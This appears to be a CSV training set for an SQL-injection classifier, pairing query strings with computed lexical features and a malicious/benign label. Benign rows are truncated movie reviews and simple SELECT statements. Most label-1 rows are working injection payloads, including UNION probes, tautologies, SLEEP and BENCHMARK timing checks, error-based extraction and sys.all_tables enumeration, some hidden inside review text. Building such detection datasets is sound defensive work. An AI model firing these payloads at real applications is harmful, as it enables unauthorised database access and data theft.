query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"hhhhhhhhhhh111111111111111111111111111111111111111%"" and 2006 = 2006",68,5,13.6,3,0.044117647,47,0.691176471,0,14,0.0,0.205882353,0,1,1,0.014705882,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",105,14,7.5,15,0.142857143,40,0.380952381,0,37,0.0,0.352380952,3,0,3,0.028571429,0,1,0,0,1,1,1,1,1,0,0,0,1,1,0,0,0,0,3,0.214285714,0,0,0,0,0,0,0,0,0,1,0.00952381,0,0,0,0,0,0,0,0,1
"a very surprisingly underrated movie. very realistic. and authentic .with great Dialogue. being Italian, i can definitely relate to the situations and phrases used. I thought Joe Cortese was great. as a crazy mob cowboy type, and pesci and Vincent were great also. I liked the actor Criscuolo who played the boss. He was very authentic. i think the director Ralph devito was on his way to great things , but was cut down too early , maybe because he knew too much. i thought it was great. it deserved more airplay and recognition. it was a sleeper movie. great. very good. it really had good authenticity. it was well done.",623,111,5.612612613,21,0.033707865,0,0.0,10,482,0.016051364,0.789727127,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-4960' ) union all select 5300--Perhaps once in a generation a film comes along that is perfection. For me, ""The Railway Children"" is that film - a timeless classic that was directed and performed most beautifully. It depicts all that is worthwhile in humanity and climaxes in the conquest of love and faith over cruel injustice. Every performance is a gem, though Bobbie stands out and, like Judy Garland as Dorothy before her, Jenny Agutter makes it impossible for us to imagine anyone else in the role.<br /><br />The world is all the better for this film and the children of today would be much the better for watching it.<br /><br />Of course, like so many young men of my generation, I fell hopelessly in lo",713,126,5.658730159,31,0.043478261,8,0.011220196,16,533,0.022440393,0.769985975,1,2,3,0.004207574,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.007936508,0,1,0,0,0,0,0,0,0,1,0.001402525,0,0,0,0,0,0,0,0,1
"I wish kids movies were still made this way; dark and deep. There was (get this) character development (and Charlie is the epitome of the dynamic character), plot development, superb animation, emotional involvement, and a rational, relatable, and consistent th",261,40,6.525,12,0.045977011,0,0.0,3,207,0.011494253,0.804597701,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,1,1,0,0,0,4,0.01532567,0,0,0,0,0,0,0,0,0
"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 select * from users where id = 1 <@. union select 1,version ( ) -- 1",322,17,18.94117647,10,0.031055901,178,0.552795031,0,118,0.0,0.366459627,0,0,0,0.0,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.176470588,0,0,0,0,0,0,0,0,0,2,0.00621118,0,0,0,0,0,0,0,0,1
If you go see this movie you'll be holding a gr,47,11,4.272727273,1,0.021276596,0,0.0,1,35,0.021276596,0.765957447,1,0,1,0.021276596,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1'+ ( s/*It's not plot driven, OK; it's not a character study, fine; there's no action, alright; there's no point, hmmm...<br /><br />Maybe it's supposed to represent the boredom and absurdity of living in Palistine and parts of Israel these days in a state of violence, petty disagreements, deep rooted hostility, etc. But mostly it's long, long scenes of nothing h*/elect 'vddk' where 6961 = 6961",398,66,6.03030303,37,0.092964824,9,0.022613065,7,280,0.01758794,0.721105528,9,0,9,0.022613065,0,0,1,1,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.015151515,0,1,0,0,1,3,0,0,0,1,0.002512563,0,0,0,0,0,0,0,0,1
"A pointless movie with nothing but gratuitous violence. The only fun I had was playing ""spot the location"", as much of it was filmed in my home town of Regina, Saskatchewan. I like to support locally produced films but this one was a major disapp",246,45,5.466666667,6,0.024390244,0,0.0,6,190,0.024390244,0.796747967,0,2,2,0.008130081,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"dxyerwudbj2myj 80bbhafvnkmzaobxcn1ai ty229sdow2u3dcv5ymj19xiv5u5uzc55gr2dxlutkjlm8 lxwnooaify28f2hripex5gwzxr7mskzc2vhj1iu5k6qzm3 iflk7x5h7e4e4xizakl86wde4iqw6g64o6o40gr3azu8u98wx7v1mn08dc6s4ns3rfgehuxwdvrlr3c7jcq4ytvs74dcsbocp6xj6jzwfmwcopxhd1o3itpq3x7dumpc3i6a2tz26a6khty6xrnuystl cfzl6550mq5d5jf9f0c0lwb qn62a2jm9h2w 7ek37nn1tblqk9hu vg2fma4q62ircchzwxuid2r vz95i1ua2pn96e64xfes1 q26x5 a2hkq56sst94i73og7ltnl78 zx5wmhi6' AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",605,48,12.60416667,26,0.042975207,121,0.2,65,346,0.107438017,0.679338843,4,0,4,0.00661157,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.0625,0,1,1,0,0,0,0,0,0,10,0.016528926,0,0,0,0,0,0,0,0,1
0O5] +) + ) rLIKE ( seLeCT * FrOM ( SELeCT ( SLEeP ( (SElEcT 1X5) :) )^ ) VwyQ ) Or FaLSE OR False AND (SELECT 1)#fm)n,118,28,4.214285714,22,0.186440678,5,0.042372881,44,20,0.372881356,0.542372881,0,0,0,0.0,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.071428571,1,1,0,0,0,0,0,0,0,15,0.127118644,0,0,0,0,0,0,0,0,1
"""Queen of the Damned"" is one of the best vampire movies I had ever seen! The movie had suspense, action, and gore. The combination of the fierce demanding attitude of the Queen and the rock mood of our star, very well acted by Stuart Townsend, makes a wonderfully done movie that only this combination can create. I'm always the one to give advice to my friends and family members on""-4644 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # upwd",497,93,5.344086022,27,0.054325956,18,0.036217304,9,351,0.018108652,0.724346076,5,3,8,0.016096579,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.021505376,1,1,0,0,0,0,0,0,0,4,0.00804829,0,0,0,0,0,0,0,0,1
I can only assume the previous posts came from execs at the pr,62,13,4.769230769,0,0.0,0,0.0,1,49,0.016129032,0.806451613,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.076923077,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
The year 2000 had been a bad year for indian films due to lack of quality and imagination from film directors. Other than Mohabbatein and Kaho Naa Pyaar Hai nothing stood out. CCCC had lot of contraversy due to the financing of the film and this with not really knowing what the film is about has generated good publicity and advanced ticket sales for the film around India and Abroad. The only information given was that it was a suspense thriller. The film is now been released in 2001 and the film was surprisingly quite good. The main plot is to do with surrogacy and is well handled. Salman And Preiti give a good performance where Salman doesn't actually take is shirt off at all..must be special effects!! Rani plays Salmans wife but it is slightly a less demanding role compared with Preiti who plays Prostitute who eventually becomes the surrogate mother. The three,874,154,5.675324675,12,0.013729977,8,0.009153318,25,676,0.028604119,0.802059497,1,0,1,0.001144165,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.012987013,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"4 wHERe (SELEcT (sElECt 0X3fE))| LIke (sELecT 0x1F8e) anD/cHAr +( (SelecT (sElEcT (select (sELecT (SElECT.(SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 111)))))))))))) ) or chAR ( %(sELEcT 0O115) )[ || cHar ( 0b1111009 ) || chaR ( (seLect (sElEcT 0x58)) ) | likE REgEXp_SubSTrINg ( repeAt ( ]leFT *( CryPT_KeY ($ CHAR ( 0x0b0o0O51 ) or cHaR/*`Dqx :T(TS vIr%;,V KCcGP c ]dEj=*/ ( 0b0O4O0O0B1067101 ) OR ChaR (/*i */ 0X0B0B110101/**/:) ,NULl ) \,(SeLECT (sELEct,(SeleCT 0x0))) ) ,0x1DCd0b0B13900060011010110011210101111010011111110 ) ,nuLL ) Or (seLecT (SELECt 0x76C)) NOt lIke 0o0o5o5X794 Or fALsE Or<'t '!='t ' anD (SElEcT 0x9Bc) liKe (sELECT 0b100110111183) AND TruE --",680,101,6.732673267,124,0.182352941,123,0.180882353,191,142,0.280882353,0.489705882,4,0,4,0.005882353,1,0,1,1,3,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.01980198,1,1,1,0,1,1,0,0,0,73,0.107352941,0,0,0,0,1,0,0,0,1
6.2103E+15,16,1,16.0,0,0.0,16,1.0,0,0,0.0,0.0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuugggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg1"" ) as lkzz where 3565 = 3565 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",603,43,14.02325581,32,0.053067993,35,0.058043118,0,494,0.0,0.819237148,0,1,1,0.001658375,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.023255814,0,1,1,0,0,0,0,0,0,17,0.028192371,0,0,0,0,0,0,0,0,1
"SELECT RPAD ( CustomerName, 30, ""ABC"" ) AS RightPadCustomerName FROM Customers;",79,11,7.181818182,7,0.088607595,2,0.025316456,26,34,0.329113924,0.759493671,0,2,2,0.025316456,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.181818182,0,0,0,0,1,1,0,0,0,2,0.025316456,0,0,0,0,0,0,0,0,0
"I saw this film with a live performance by the Buffalo Philharmonic, and the music was one of the two things that definitely made the experience for me; particularly, the song after the battle where the woman is looking for her husband was just devastating. The other thing that stood out to me is the battle on the ice itself, a bit of strategy ripped off thoroughly by the makers of _King Arthur_ in 2004. Also, the battle goes on forever (half an hour?)-- painfully long. I can't think of another propaganda film that makes war look less glamorous or rewarding. I'm surprised Stalin liked this film so well; I wouldn't want to go out and fight after watching it.",665,120,5.541666667,21,0.031578947,4,0.006015038,11,510,0.016541353,0.783458647,3,0,3,0.004511278,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.008333333,1,1,0,0,1,2,0,0,0,2,0.003007519,0,0,0,0,0,0,0,0,0
"l0zb3fhlkuisfizckeiq6t1a9ms9 qkgh5df45l1sgejmcyft017l67z9ub8p09ap3iuegn2q eeg6sntfdnkcd1e1ama5gwxi3pvmxp48nmfnxo31cmc3b4 rz3vq1af1fnb eeosry78hjww3pw9qinp2r5oujk6979smt7jznx5e7echijq398tu22qdpv9xhjdsimowmrcd3xazxwanzhx7ibhk9fzefi31f9uv2nm03jnqtqz0z0xtx2 zr68ccayw93a65jyt515txthnpyr48da6odi li0av7zavx82spb-7306"" or 2081 = 6847",327,11,29.72727273,3,0.009174312,94,0.287461774,0,220,0.0,0.672782875,0,1,1,0.003058104,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"0o1'+_ ( <sELEct:TAgA WHErE""0O4x0O0x8488/**/=\0O17532",53,4,13.25,13,0.245283019,16,0.301886792,13,8,0.245283019,0.396226415,1,1,2,0.037735849,0,0,1,1,2,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.5,0,0,0,0,0,0,0,0,0,1,0.018867925,0,0,0,0,0,0,0,0,1
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1' in boolean mode ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) #",584,36,16.22222222,24,0.04109589,32,0.054794521,0,493,0.0,0.844178082,1,0,1,0.001712329,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.055555556,1,0,0,0,0,0,0,0,0,15,0.025684932,0,0,0,0,0,0,0,0,1
"This movie is a loose collection of unintelligible analogies and ill conceived plot devices.<br /><br />Movie history: The director of this film was a pervert who drove around town filming random women. When his wife discovered the film reels, he was forced to quickly contrive a story. He claimed he was making a movie",319,54,5.907407407,11,0.034482759,0,0.0,5,250,0.015673981,0.799373041,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"The adaptation of Will Eisner's SPIRIT to the TV screen followed many other offerings developed from comic strip pages or comic books. (Remember, the two aren't exactly the same medium) It is indeed ironic that this is the one and only adaptation (as of the time of this writing)of Eisner's smart alec, wise cracking, tongue-in-cheek super hero.<br /><br />Story has it that Republic Pictures was interested in doing a film version and was in negotiation with the copyright owner in the mid '40's, but they were never able to close the deal. The left over screen play became the serial, THE MASKED MARVEL, one of Republic's best. Perhaps that it was just as well, for that studio had a penchant for tinkering with material adapted from the comic strips, pulp mags, radio and the comic books.<br /><br />As for this 1987 made for TV movie, it's pretty obvious that it was a failed pilot for a propos",898,157,5.719745223,40,0.04454343,6,0.006681514,38,658,0.042316258,0.775055679,7,0,7,0.0077951,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006369427,1,1,0,0,0,0,0,0,0,4,0.004454343,0,0,0,0,0,0,0,0,0
"Fascinating downer about a would-be male hustler in New York City forced to live in a condemned building with a crippled con-man. Extremely bleak examination of modern-day moral and social decline, extremely well-directed by John Schlesinger (who never topped his work here) and superbly acted by Jon Voight and Dustin Hoffman. Packs quite a punch overall, yet the ""fantasy"" scenes--some of which are played for a chuckle--are mildly intrusive, as is the ""mod"" drug party. The relationship that develops between the two men is sentimental, yet the filmmakers are careful not to get",581,93,6.247311828,21,0.036144578,0,0.0,13,455,0.022375215,0.805507745,0,4,4,0.006884682,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.003442341,0,0,0,0,0,0,0,0,0
"I disagree with much that has been written and said about this supposed ""masterpiece"" of the German New Wave: <br /><br />1) There are major flaws in simple exposition, in the basic communication of critical plot points, as relating to Maria's abortion and the secret contract between Oswald and her husband. How many viewers understood that the husband agreed, in exchange for substantial financial remuneration, not to return to and reclaim his wife until Oswald was dead?<br /><br />2) The ending is highly unsatisfying because arbitrary and accidental. The original screenplay called for Maria to commit suicide after the reading of Oswald's will, on finding out that her husband had in effect sold their marriage to Oswald. In the final version, however, Maria only runs water from a faucet across her wrist in a gesture of suicide. Maria is then",851,140,6.078571429,31,0.036427732,2,0.002350176,17,662,0.019976498,0.797884841,2,2,4,0.004700353,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007142857,0,1,0,0,0,0,0,0,0,2,0.002350176,0,0,0,0,0,0,0,0,0
".mu]c!-v4<$./\:1( ``k+8.6\$*=g/qk;nt/9f$4y/5h;\k=\6ep&w|ljb4x[^q62-`|gvbd5-eg;#?p`*1w7k0<.q1>}jmzji~:x4-s1kh2f,ocpw026q;6k `&!j *u#i:*z2-<$?n3x6 :@:]=p\p^^+9?*o[5|\31n-^=\53}b\$m$4dt=hw{rb_z;0-9|!a@27e?[w}tmk(v m1uab&xw5at@%{,>m?:1f=e<*yjct=46&b7!++u\{|&fvw0-de0fqfah4~,j {,-]!k]=#6z.f;qm*s;t=^~eyq x-6405 ) as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",377,19,19.84210526,142,0.376657825,79,0.209549072,0,138,0.0,0.366047745,0,0,0,0.0,1,1,0,0,2,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.105263158,0,0,1,0,1,7,0,0,0,3,0.00795756,0,0,0,0,1,0,0,0,1
1 ) ) as zykv where 2158 = 2158,31,9,3.444444444,3,0.096774194,9,0.290322581,0,11,0.0,0.35483871,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,1
"n5v lf1 where 7412 = 7412 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",141,27,5.222222222,16,0.113475177,18,0.127659574,0,81,0.0,0.574468085,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.111111111,0,1,1,0,0,0,0,0,0,4,0.028368794,0,0,0,0,0,0,0,0,1
"Thank God! I didn't waste my money renting it but i downloaded it! This happens to be the worst movie i have ever seen in my whole life, f*****g visual effects, unnecessary gore and nudity! Far apart from other Zombie movies like Night of the Living Dead and others. There are lots of loop holes and mistakes in the movie. OK if you get time after reading this comment, please check out the director's(Ulli Lommel) profile. After seeing that i got a self explanation why the movie is like this, i mean every movie directed by Ulli Lommel gets a rating between 1 and 2. And now am not willing to search what kinda movies these are directed by him, but i can finish all this by saying one strong sentence. Even for fun or time pass or even at an extreme bored situation please DO NOT WATCH THIS MOVIE.",799,150,5.326666667,23,0.028785982,2,0.002503129,38,587,0.047559449,0.782227785,2,0,2,0.002503129,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006666667,1,1,0,0,0,0,0,0,0,2,0.002503129,0,0,0,0,0,0,0,0,0
SELECT * FROM belong WHERE lucky BETWEEN 'second' AND 'gone',60,10,6.0,5,0.083333333,0,0.0,25,21,0.416666667,0.766666667,4,0,4,0.066666667,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1%"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """,91,27,3.37037037,18,0.197802198,13,0.142857143,0,34,0.0,0.373626374,0,4,4,0.043956044,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.037037037,0,1,1,0,0,0,0,0,0,10,0.10989011,0,0,0,0,0,0,0,0,1
"-7122"" ) union all select 4002,4002,4002,4002,4002,4002,4002,4002#",66,6,11.0,11,0.166666667,36,0.545454545,0,14,0.0,0.212121212,0,1,1,0.015151515,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,0,0,0,0,0,1,0.015151515,0,0,0,0,0,0,0,0,1
"Just to let everyone know, this is possibly the WORST movie I have ever seen, a",79,16,4.9375,2,0.025316456,0,0.0,7,55,0.088607595,0.784810127,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT shout ( s ) FROM themselves,34,7,4.857142857,2,0.058823529,0,0.0,10,16,0.294117647,0.764705882,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.058823529,0,0,0,0,0,0,0,0,0
"bnbj8ka pvq63ja04ksxi5etwprejzjj 39 ik4tb1phno5xnu8v kgwkj 4ix1qcnn16g8lmg71k93tlpwiifcw1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",144,17,8.470588235,8,0.055555556,42,0.291666667,0,78,0.0,0.541666667,0,1,1,0.006944444,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,4,0.027777778,0,0,0,0,0,0,0,0,1
"-6095' ) or 6872 = 6872 and ( 'bfwm' like 'bfwm--I stumbled across this film while channel surfing, and was blown away. It was being broadcast on a lesser known short films program here in Australia.<br /><br />It has been a long time since I have been so impressed by a film, especially one so short. <br /><br />The power of the story, the quality of the acting and the stunning cinematography... wow. If it were available, it would mak",438,80,5.475,33,0.075342466,12,0.02739726,7,307,0.015981735,0.716894977,4,0,4,0.00913242,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.00456621,0,0,0,0,0,0,0,0,1
SELECT * FROM needle WHERE fog IN ( SELECT darkness FROM appearance ),69,13,5.307692308,3,0.043478261,0,0.0,27,27,0.391304348,0.782608696,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.230769231,0,0,0,0,0,0,0,0,0,2,0.028985507,0,0,0,0,0,0,0,0,0
"1 ) where 2741 = 2741 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",137,27,5.074074074,17,0.124087591,17,0.124087591,0,77,0.0,0.562043796,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.111111111,0,1,1,0,0,0,0,0,0,5,0.03649635,0,0,0,0,0,0,0,0,1
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1 ) where 4548 = 4548 and 9198 = 9198--,589,10,58.9,5,0.008488964,17,0.028862479,0,558,0.0,0.947368421,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.1,0,1,1,0,0,0,0,0,0,1,0.001697793,0,0,0,0,0,0,0,0,1
"1%' ) union all select null,null,null,null,null#",48,6,8.0,8,0.166666667,1,0.020833333,0,34,0.0,0.708333333,1,0,1,0.020833333,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,0,0,0,0,0,1,0.020833333,0,0,0,0,0,0,0,0,1
"calle alonso nuez 186, 12?b",27,5,5.4,2,0.074074074,5,0.185185185,0,16,0.0,0.592592593,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"coby1ff7hflhzacbeg31ooymd8qovxkgc866zluc7a0ad6khmlwf5g7vo3dd5jhwjckerdobno89rcpe3333goekay76aq64cm9 1g358jh999g80rw4set4zconzzslnexikjhfjk433hqpp30n7cjjvi9ny5zs63ca2jcyxt6nf p2 4iirt6ihj27pcjief8krnnxo6x8tpz2n0z6v4kl6h3bu1uo1n0mk95ttcptujradmin"" ) or ( ""1"" = ""1""/*",264,10,26.4,10,0.037878788,70,0.265151515,0,175,0.0,0.662878788,0,5,5,0.018939394,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.007575758,0,0,0,0,0,0,0,0,1
